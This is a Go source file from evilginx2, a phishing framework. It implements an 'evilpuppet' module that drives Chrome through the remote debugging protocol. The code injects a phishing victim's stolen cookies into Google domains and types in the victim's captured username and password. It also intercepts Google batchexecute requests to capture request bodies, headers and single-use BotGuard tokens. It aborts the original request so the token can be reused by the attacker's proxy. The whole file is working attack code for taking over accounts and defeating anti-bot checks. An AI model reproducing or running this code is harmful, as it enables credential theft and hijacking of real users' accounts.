package core

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/input"
	"github.com/go-rod/rod/lib/proto"

	"github.com/kgretzky/evilginx2/log"
)

// EvilPuppetRod manages background browser automation using go-rod
// This connects to an existing Chrome instance via remote debugging protocol
type EvilPuppetRod struct {
	sync.RWMutex
	enabled        bool
	debugPort      int // Chrome remote debugging port (default 9222)
	timeout        int // default timeout in seconds
	debug          bool
	activeSessions map[string]*rod.Browser // session_id -> browser
}

// NewEvilPuppetRod creates a new EvilPuppetRod instance
func NewEvilPuppetRod() *EvilPuppetRod {
	return &EvilPuppetRod{
		enabled:        false,
		debugPort:      9222,
		timeout:        30,
		debug:          false,
		activeSessions: make(map[string]*rod.Browser),
	}
}

// Enable sets the enabled state
func (ep *EvilPuppetRod) Enable(enabled bool) {
	ep.Lock()
	defer ep.Unlock()
	ep.enabled = enabled
}

// IsEnabled returns whether evilpuppet is enabled
func (ep *EvilPuppetRod) IsEnabled() bool {
	ep.RLock()
	defer ep.RUnlock()
	return ep.enabled
}

// SetDebugPort sets the Chrome remote debugging port
func (ep *EvilPuppetRod) SetDebugPort(port int) {
	ep.Lock()
	defer ep.Unlock()
	ep.debugPort = port
}

// SetTimeout sets the default timeout in seconds
func (ep *EvilPuppetRod) SetTimeout(timeout int) {
	ep.Lock()
	defer ep.Unlock()
	ep.timeout = timeout
}

// SetDebug sets debug mode
func (ep *EvilPuppetRod) SetDebug(debug bool) {
	ep.Lock()
	defer ep.Unlock()
	ep.debug = debug
}

// GetTimeout returns the default timeout
func (ep *EvilPuppetRod) GetTimeout() int {
	ep.RLock()
	defer ep.RUnlock()
	return ep.timeout
}

// getWebSocketDebuggerURL fetches the WebSocket URL from Chrome's debug endpoint
func (ep *EvilPuppetRod) getWebSocketDebuggerURL() (string, error) {
	ep.RLock()
	port := ep.debugPort
	ep.RUnlock()

	url := fmt.Sprintf("http://127.0.0.1:%d/json", port)
	resp, err := http.Get(url)
	if err != nil {
		return "", fmt.Errorf("failed to connect to Chrome debug port %d: %v", port, err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("failed to read response: %v", err)
	}

	var targets []map[string]interface{}
	if err := json.Unmarshal(body, &targets); err != nil {
		return "", fmt.Errorf("failed to parse JSON: %v", err)
	}

	if len(targets) == 0 {
		return "", fmt.Errorf("no debug targets found")
	}

	wsURL, ok := targets[0]["webSocketDebuggerUrl"].(string)
	if !ok || wsURL == "" {
		return "", fmt.Errorf("webSocketDebuggerUrl not found in response")
	}

	return wsURL, nil
}

// MatchTrigger checks if the request matches any evilpuppet trigger
func (ep *EvilPuppetRod) MatchTrigger(cfg *EvilPuppetConfig, host string, path string, contentType string) bool {
	if cfg == nil || !cfg.Enabled {
		return false
	}

	if strings.Contains(path, "batchexecute") {
		log.Warning("[evilpuppet-rod] BATCHEXEC checking %d triggers, cfg.Enabled=%v, host=%s path=%s", len(cfg.Triggers), cfg.Enabled, host, path)
	}

	for i, trigger := range cfg.Triggers {
		domainMatch := false
		for _, d := range trigger.Domains {
			log.Debug("[evilpuppet-rod] domain check: trigger_domain=%s vs request_host=%s", d, host)
			if d == host {
				domainMatch = true
				break
			}
		}
		if !domainMatch {
			if strings.Contains(path, "batchexecute") {
				log.Warning("[evilpuppet-rod] [%d] BATCHEXEC domain MISMATCH: wanted=%v got=[%s]", i, trigger.Domains, host)
			}
			continue
		}

		pathMatch := false
		for _, p := range trigger.Paths {
			if p.MatchString(path) {
				pathMatch = true
				break
			}
		}
		if !pathMatch {
			if strings.Contains(path, "batchexecute") {
				log.Warning("[evilpuppet-rod] [%d] BATCHEXEC path MISMATCH: path=%s", i, path)
			}
			continue
		}

		// Check content type if specified
		if trigger.ContentType != "" {
			ct := strings.ToLower(contentType)
			switch trigger.ContentType {
			case "json":
				if !strings.Contains(ct, "json") {
					continue
				}
			case "post":
				if ct == "" {
					continue
				}
			}
		}

		return true
	}
	return false
}

// HandleTrigger spawns a browser session using go-rod connected to existing Chrome
func (ep *EvilPuppetRod) HandleTrigger(sessionId string, cfg *EvilPuppetConfig, credentials map[string]string, phishDomain string, victimCookies string) <-chan *EvilPuppetResult {
	resultCh := make(chan *EvilPuppetResult, 1)

	go func() {
		defer close(resultCh)

		ep.RLock()
		timeout := ep.timeout
		debug := ep.debug
		ep.RUnlock()

		if cfg.Timeout > 0 {
			timeout = cfg.Timeout
		}

		result := &EvilPuppetResult{
			Tokens: make(map[string]string),
		}

		log.Info("[evilpuppet-rod] [%s] Starting browser session via remote debugging", sessionId)

		// Get WebSocket URL from Chrome
		wsURL, err := ep.getWebSocketDebuggerURL()
		if err != nil {
			result.Error = fmt.Errorf("failed to get Chrome WebSocket URL: %v", err)
			log.Error("[evilpuppet-rod] [%s] %v", sessionId, result.Error)
			resultCh <- result
			return
		}
		log.Debug("[evilpuppet-rod] [%s] Connected to Chrome via: %s", sessionId, wsURL)

		// Connect to existing Chrome
		browser := rod.New().ControlURL(wsURL)
		err = browser.Connect()
		if err != nil {
			result.Error = fmt.Errorf("failed to connect to Chrome: %v", err)
			log.Error("[evilpuppet-rod] [%s] %v", sessionId, result.Error)
			resultCh <- result
			return
		}

		// Store browser reference for cancellation
		ep.Lock()
		ep.activeSessions[sessionId] = browser
		ep.Unlock()
		defer func() {
			ep.Lock()
			delete(ep.activeSessions, sessionId)
			ep.Unlock()
		}()

		// Create a new page (incognito context for isolation)
		page, err := browser.Page(proto.TargetCreateTarget{URL: "about:blank"})
		if err != nil {
			result.Error = fmt.Errorf("failed to create page: %v", err)
			log.Error("[evilpuppet-rod] [%s] %v", sessionId, result.Error)
			resultCh <- result
			return
		}
		defer page.Close()

		// Set timeout
		page = page.Timeout(time.Duration(timeout) * time.Second)

		// Token capture channel
		tokensCh := make(chan map[string]string, 1)
		capturedTokens := make(map[string]string)
		var tokensMu sync.Mutex

		// Set up network interception for token capture from request body/URL
		router := page.HijackRequests()
		defer router.Stop()

		// Pattern to intercept all requests and capture tokens
		router.MustAdd("*", func(ctx *rod.Hijack) {
			reqURL := ctx.Request.URL().String()

			// Full body swap: capture entire MI613e batchexecute body, URL, cookies, and headers
			// This is far more robust than replacing individual tokens
			if strings.Contains(reqURL, "batchexecute") {
				rawBody := ctx.Request.Body()
				log.Debug("[evilpuppet-rod] batchexecute body len=%d, contains MI613e=%v, URL=%s", len(rawBody), strings.Contains(rawBody, "MI613e"), reqURL[:min(100, len(reqURL))])
				if strings.Contains(rawBody, "MI613e") {
					cookieHdr := ctx.Request.Header("Cookie")
					// Capture ALL headers from go-rod's request
					allHeaders := ctx.Request.Headers()
					var headerDump string
					for k, v := range allHeaders {
						headerDump += fmt.Sprintf("%s: %s\n", k, v.String())
					}
					// Capture specific Google headers that must match the body
					userAgent := ctx.Request.Header("User-Agent")
					tokensMu.Lock()
					capturedTokens["__full_body__"] = rawBody
					capturedTokens["__full_url__"] = reqURL
					capturedTokens["__full_cookies__"] = cookieHdr
					capturedTokens["__full_headers__"] = headerDump
					capturedTokens["__full_useragent__"] = userAgent
					// Capture x-goog-ext headers, x-same-domain, and sec-ch-ua* Client Hints
					for k, v := range allHeaders {
						kLower := strings.ToLower(k)
						if strings.HasPrefix(kLower, "x-goog-ext-") || kLower == "x-same-domain" || strings.HasPrefix(kLower, "sec-ch-ua") {
							capturedTokens["__hdr_"+kLower+"__"] = v.String()
							log.Info("[evilpuppet-rod] Captured header %s = %s", k, v.String())
						}
					}
					log.Info("[evilpuppet-rod] Captured full MI613e body (%d bytes), URL, cookies (%d bytes), headers (%d bytes), UA=%s", len(rawBody), len(cookieHdr), len(headerDump), userAgent)
					tokensMu.Unlock()
				}
			}

			for _, interceptor := range cfg.Interceptors {
				// Check domain match
				if interceptor.Domain != "" && !strings.Contains(reqURL, interceptor.Domain) {
					continue
				}
				// Check path match
				if interceptor.Path != nil && !interceptor.Path.MatchString(reqURL) {
					continue
				}

				var searchText string
				switch interceptor.Source {
				case "request_body":
					searchText = ctx.Request.Body()
					if searchText != "" && strings.Contains(reqURL, "batchexecute") {
						log.Debug("[evilpuppet-rod] Request body len=%d for %s", len(searchText), interceptor.TokenName)
						// URL decode the body
						decoded, err := url.QueryUnescape(searchText)
						if err == nil {
							searchText = decoded
						}
						preview := searchText
						if len(preview) > 500 {
							preview = preview[:500]
						}
						log.Debug("[evilpuppet-rod] Body preview: %s", preview)
					}
				case "request_url":
					searchText = reqURL
				default:
					continue // Handle response body separately
				}

				if searchText != "" && interceptor.Search != nil {
					matches := interceptor.Search.FindStringSubmatch(searchText)
					if len(matches) > 1 {
						tokensMu.Lock()
						capturedTokens[interceptor.TokenName] = matches[1]
						log.Info("[evilpuppet-rod] Captured token '%s' (%d bytes) from %s", interceptor.TokenName, len(matches[1]), interceptor.Source)

						// Check if all regular tokens captured (exclude __full_body__, __full_url__)
						regularCount := 0
						for k := range capturedTokens {
							if !strings.HasPrefix(k, "__") {
								regularCount++
							}
						}
						if regularCount >= len(cfg.Interceptors) {
							select {
							case tokensCh <- capturedTokens:
							default:
							}
						}
						tokensMu.Unlock()
					} else if interceptor.Source == "request_body" && strings.Contains(reqURL, "batchexecute") {
						log.Debug("[evilpuppet-rod] No match for %s regex in body", interceptor.TokenName)
					}
				}
			}

			// Abort MI613e batchexecute requests to preserve the BotGuard token
			// (single-use token would be consumed by Google if continued)
			shouldAbort := false
			if strings.Contains(reqURL, "batchexecute") {
				rawBody := ctx.Request.Body()
				if strings.Contains(rawBody, "MI613e") {
					tokensMu.Lock()
					_, hasFull := capturedTokens["__full_body__"]
					shouldAbort = hasFull
					tokensMu.Unlock()
				}
			}

			if shouldAbort {
				ctx.Response.Fail(proto.NetworkErrorReasonAborted)
				log.Info("[evilpuppet-rod] [%s] Aborted MI613e batchexecute (preserving BotGuard token for proxy injection)", sessionId)
			} else {
				ctx.ContinueRequest(&proto.FetchContinueRequest{})
			}
		})

		// Listen for network responses to capture tokens from response body
		go func() {
			page.EachEvent(func(e *proto.NetworkResponseReceived) {
				reqURL := e.Response.URL
				for _, interceptor := range cfg.Interceptors {
					// Check domain match
					if interceptor.Domain != "" && !strings.Contains(reqURL, interceptor.Domain) {
						continue
					}
					// Check path match
					if interceptor.Path != nil && !interceptor.Path.MatchString(reqURL) {
						continue
					}

					// Get response body
					res, err := proto.NetworkGetResponseBody{RequestID: e.RequestID}.Call(page)
					if err != nil {
						continue
					}

					body := res.Body
					if interceptor.Source == "body" && interceptor.Search != nil {
						matches := interceptor.Search.FindStringSubmatch(body)
						if len(matches) > 1 {
							tokensMu.Lock()
							capturedTokens[interceptor.TokenName] = matches[1]
							tokensMu.Unlock()
							log.Info("[evilpuppet-rod] [%s] Captured token '%s' (%d bytes)", sessionId, interceptor.TokenName, len(matches[1]))

							// Check if all regular tokens captured
							regularCount := 0
							for k := range capturedTokens {
								if !strings.HasPrefix(k, "__") {
									regularCount++
								}
							}
							if regularCount >= len(cfg.Interceptors) {
								tokensCh <- capturedTokens
							}
						}
					}
				}
			})()
		}()

		// Navigate to start_url first (needed before setting __Host- cookies)
		if cfg.StartURL != "" {
			log.Debug("[evilpuppet-rod] [%s] Navigating to start_url: %s", sessionId, cfg.StartURL)
			err = page.Navigate(cfg.StartURL)
			if err != nil {
				result.Error = fmt.Errorf("failed to navigate to start_url: %v", err)
				log.Error("[evilpuppet-rod] [%s] %v", sessionId, result.Error)
				resultCh <- result
				return
			}
			err = page.WaitLoad()
			if err != nil {
				log.Warning("[evilpuppet-rod] [%s] WaitLoad warning: %v", sessionId, err)
			}
			log.Info("[evilpuppet-rod] [%s] Navigated to start_url", sessionId)
		}

		// Inject victim's cookies AFTER navigating (required for __Host- cookies)
		if victimCookies != "" {
			log.Debug("[evilpuppet-rod] [%s] Injecting victim cookies into browser session", sessionId)

			// Parse cookies from header string (format: "name1=value1; name2=value2")
			cookiePairs := strings.Split(victimCookies, "; ")
			for _, pair := range cookiePairs {
				parts := strings.SplitN(pair, "=", 2)
				if len(parts) == 2 {
					cookieName := strings.TrimSpace(parts[0])
					cookieValue := strings.TrimSpace(parts[1])

					// For __Host- cookies, use exact hostname without leading dot
					domain := ".google.com"
					if strings.HasPrefix(cookieName, "__Host-") {
						domain = "accounts.google.com"
					}

					// Set cookie
					_, err := proto.NetworkSetCookie{
						Name:     cookieName,
						Value:    cookieValue,
						Domain:   domain,
						Path:     "/",
						Secure:   true,
						HTTPOnly: strings.HasPrefix(cookieName, "__Host-"),
					}.Call(page)

					if err != nil {
						log.Warning("[evilpuppet-rod] [%s] Failed to set cookie %s: %v", sessionId, cookieName, err)
					} else {
						log.Debug("[evilpuppet-rod] [%s] Set cookie: %s (len=%d) domain=%s", sessionId, cookieName, len(cookieValue), domain)
					}
				}
			}

			// Reload page to apply cookies
			log.Debug("[evilpuppet-rod] [%s] Reloading page to apply cookies", sessionId)
			err = page.Reload()
			if err != nil {
				log.Warning("[evilpuppet-rod] [%s] Reload warning: %v", sessionId, err)
			}
			page.WaitLoad()
		}

		// Execute actions
		log.Debug("[evilpuppet-rod] [%s] Executing %d actions", sessionId, len(cfg.Actions))

		for i, action := range cfg.Actions {
			selector := action.Selector
			value := ep.replacePlaceholders(action.Value, credentials, phishDomain)

			if debug {
				log.Debug("[evilpuppet-rod] [%s] Action %d: %s selector=%s value=%s", sessionId, i+1, action.Type, selector, value)
			}

			switch action.Type {
			case "navigate":
				err = page.Navigate(value)
				if err == nil {
					err = page.WaitLoad()
					log.Debug("[evilpuppet-rod] [%s] Navigated to: %s", sessionId, value)
				}

			case "click":
				el, findErr := page.Element(selector)
				if findErr != nil {
					err = findErr
				} else {
					err = el.Click(proto.InputMouseButtonLeft, 1)
					if err == nil {
						log.Debug("[evilpuppet-rod] [%s] Clicked: %s", sessionId, selector)
					}
				}

			case "type":
				el, findErr := page.Element(selector)
				if findErr != nil {
					err = findErr
				} else {
					err = el.SelectAllText()
					if err == nil {
						err = el.Input(value)
					}
					if err == nil {
						log.Debug("[evilpuppet-rod] [%s] Typed into: %s", sessionId, selector)
					}
				}

			case "wait":
				_, err = page.Element(selector)
				if err == nil {
					log.Debug("[evilpuppet-rod] [%s] Element found: %s", sessionId, selector)
				}

			case "waitVisible":
				el, findErr := page.Element(selector)
				if findErr != nil {
					err = findErr
				} else {
					err = el.WaitVisible()
					if err == nil {
						log.Debug("[evilpuppet-rod] [%s] Element visible: %s", sessionId, selector)
					}
				}

			case "waitLoad":
				err = page.WaitLoad()
				if err == nil {
					log.Debug("[evilpuppet-rod] [%s] Page loaded", sessionId)
				}

			case "sleep":
				var ms int
				_, parseErr := fmt.Sscanf(value, "%d", &ms)
				if parseErr != nil {
					ms = 1000
				}
				time.Sleep(time.Duration(ms) * time.Millisecond)
				log.Debug("[evilpuppet-rod] [%s] Slept for %dms", sessionId, ms)

			case "javascript":
				_, err = page.Eval(value)
				if err == nil {
					log.Debug("[evilpuppet-rod] [%s] Executed JavaScript", sessionId)
				}

			case "submit":
				el, findErr := page.Element(selector)
				if findErr != nil {
					err = findErr
				} else {
					// Focus the element first, then press Enter
					err = el.Focus()
					if err == nil {
						err = page.Keyboard.Press(input.Enter)
					}
					if err == nil {
						log.Debug("[evilpuppet-rod] [%s] Submitted form: %s", sessionId, selector)
					}
				}

			case "screenshot":
				data, screenshotErr := page.Screenshot(false, nil)
				if screenshotErr == nil {
					log.Debug("[evilpuppet-rod] [%s] Screenshot captured (%d bytes)", sessionId, len(data))
				}

			default:
				log.Warning("[evilpuppet-rod] [%s] Unknown action type: %s", sessionId, action.Type)
			}

			if err != nil {
				log.Warning("[evilpuppet-rod] [%s] Action %d (%s) failed: %v", sessionId, i+1, action.Type, err)
			}
		}

		// Wait for tokens with timeout
		select {
		case tokens := <-tokensCh:
			for k, v := range tokens {
				result.Tokens[k] = v
			}
			log.Info("[evilpuppet-rod] [%s] All tokens captured successfully", sessionId)
		case <-time.After(time.Duration(timeout) * time.Second):
			// Return whatever tokens we captured
			tokensMu.Lock()
			for k, v := range capturedTokens {
				result.Tokens[k] = v
			}
			tokensMu.Unlock()
			if len(result.Tokens) == 0 {
				result.Error = fmt.Errorf("timeout waiting for tokens")
				log.Warning("[evilpuppet-rod] [%s] Timeout - no tokens captured", sessionId)
			} else {
				log.Info("[evilpuppet-rod] [%s] Timeout - captured %d/%d tokens", sessionId, len(result.Tokens), len(cfg.Interceptors))
			}
		}

		resultCh <- result
	}()

	return resultCh
}

// replacePlaceholders replaces template variables in action values
func (ep *EvilPuppetRod) replacePlaceholders(s string, credentials map[string]string, phishDomain string) string {
	s = strings.ReplaceAll(s, "{username}", credentials["username"])
	s = strings.ReplaceAll(s, "{password}", credentials["password"])
	s = strings.ReplaceAll(s, "{phish_domain}", phishDomain)
	for k, v := range credentials {
		s = strings.ReplaceAll(s, "{custom:"+k+"}", v)
	}
	return s
}

// CancelSession cancels an active evilpuppet session
func (ep *EvilPuppetRod) CancelSession(sessionId string) {
	ep.Lock()
	defer ep.Unlock()
	if browser, ok := ep.activeSessions[sessionId]; ok {
		browser.Close()
		delete(ep.activeSessions, sessionId)
	}
}

// Shutdown closes all active sessions
func (ep *EvilPuppetRod) Shutdown() {
	ep.Lock()
	defer ep.Unlock()
	for sid, browser := range ep.activeSessions {
		log.Debug("[evilpuppet-rod] Closing session: %s", sid)
		browser.Close()
	}
	ep.activeSessions = make(map[string]*rod.Browser)
}

// ActiveSessionCount returns the number of active evilpuppet sessions
func (ep *EvilPuppetRod) ActiveSessionCount() int {
	ep.RLock()
	defer ep.RUnlock()
	return len(ep.activeSessions)
}

// IsChromeRunning checks if Chrome is running with remote debugging enabled
func (ep *EvilPuppetRod) IsChromeRunning() bool {
	_, err := ep.getWebSocketDebuggerURL()
	return err == nil
}
